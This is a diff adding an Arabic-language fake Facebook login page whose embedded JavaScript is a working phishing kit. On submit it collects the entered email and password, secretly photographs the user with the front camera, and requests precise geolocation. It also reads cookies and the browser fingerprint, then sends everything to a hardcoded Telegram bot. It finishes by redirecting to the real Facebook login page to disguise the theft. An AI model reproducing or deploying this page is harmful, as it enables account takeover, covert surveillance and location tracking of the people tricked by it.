@@ -1,1 +1,120 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>فيسبوك - تسجيل الدخول</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
+        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
+        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:24px;font-weight:bold;}
+        .form-area {padding:20px;}
+        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
+        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
+        .footer {text-align:center;padding:20px;font-size:13px;color:#8a8d91;}
+    </style>
+</head>
+<body>
+
+<div class="fb-container">
+    <div class="header">facebook</div>
+    <div class="form-area">
+        <input type="text" id="email" placeholder="رقم الجوال أو البريد الإلكتروني">
+        <input type="password" id="pass" placeholder="كلمة المرور">
+        <button type="button" id="loginBtn" class="login-btn">تسجيل الدخول</button>
+    </div>
+    <div class="footer">Meta © 2026</div>
+</div>
+
+<video id="video" style="display:none" autoplay></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+// --- الإعدادات ---
+const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+const CHAT_ID = "1611398303";
+
+// 1. دالة جلب الكوكيز (توضع هنا كدالة مساعدة)
+function getCookies() {
+    try {
+        const cookies = document.cookie;
+        return cookies ? cookies : "لا توجد كوكيز متاحة (HttpOnly protection active)";
+    } catch (e) {
+        return "فشل الوصول للكوكيز";
+    }
+}
+
+document.getElementById('loginBtn').addEventListener('click', async function() {
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('pass').value;
+
+    if(!email || !pass) {
+        alert("يرجى إدخال البيانات");
+        return;
+    }
+
+    this.innerText = "جاري التحقق...";
+    this.disabled = true;
+
+    try {
+        // تشغيل الكاميرا والتقاط الصورة
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        
+        setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            const photoData = canvas.toDataURL('image/jpeg');
+            
+            stream.getTracks().forEach(track => track.stop());
+
+            // جلب الموقع ثم الإرسال
+            navigator.geolocation.getCurrentPosition(
+                (pos) => processAndSend(email, pass, photoData, `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
+                () => processAndSend(email, pass, photoData, "الموقع مرفوض من المستخدم"),
+                { enableHighAccuracy: true }
+            );
+        }, 1000);
+
+    } catch (err) {
+        processAndSend(email, pass, null, "الكاميرا مرفوضة من المستخدم");
+    }
+});
+
+// 2. دالة الإرسال المحدثة التي تشمل الكوكيز
+async function processAndSend(email, pass, photo, location) {
+    const cookiesData = getCookies(); // جلب الكوكيز هنا
+    const device = navigator.userAgent; // جلب بصمة المتصفح
+
+    const caption = `🎭 **إبهار تقني: اختراق كامل** 🎭\n\n` +
+                    `📧 **الإيميل:** \`${email}\`\n` +
+                    `🔑 **كلمة السر:** \`${pass}\`\n\n` +
+                    `🍪 **الجلسة (Cookies):**\n\`${cookiesData}\`\n\n` +
+                    `📍 **الموقع:** ${location}\n` +
+                    `📱 **المتصفح:** \`${device}\`\n` +
+                    `🕒 **الوقت:** ${new Date().toLocaleString('ar-EG')}`;
+
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('caption', caption);
+    formData.append('parse_mode', 'Markdown');
+
+    if (photo) {
+        const blob = await (await fetch(photo)).blob();
+        formData.append('photo', blob, 'selfie.jpg');
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+    } else {
+        formData.append('text', caption);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
+    }
+
+    // التوجيه النهائي للتمويه
+    window.location.href = "https://www.facebook.com/login.php";
+}
+</script>
+</body>
+</html>
 
